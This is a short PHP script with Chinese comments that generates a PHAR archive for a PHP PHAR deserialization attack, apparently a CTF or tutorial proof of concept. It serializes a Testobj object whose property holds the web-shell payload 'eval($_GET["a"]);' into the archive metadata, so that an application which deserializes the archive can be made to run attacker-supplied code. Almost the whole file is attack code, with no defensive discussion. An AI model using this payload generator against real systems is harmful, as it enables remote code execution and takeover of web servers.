<?php
highlight_file(__FILE__);
class Testobj
{
    var $output='';
}

@unlink('test.phar');   //删除之前的test.par文件(如果有)
$phar=new Phar('test.phar');  //创建一个phar对象，文件名必须以phar为后缀
$phar->startBuffering();  //开始写文件
$phar->setStub('<?php __HALT_COMPILER(); ?>');  //写入stub
$o=new Testobj();
$o->output='eval($_GET["a"]);';
$phar->setMetadata($o);//写入meta-data
$phar->addFromString("test.txt","test");  //添加要压缩的文件
$phar->stopBuffering();
?>
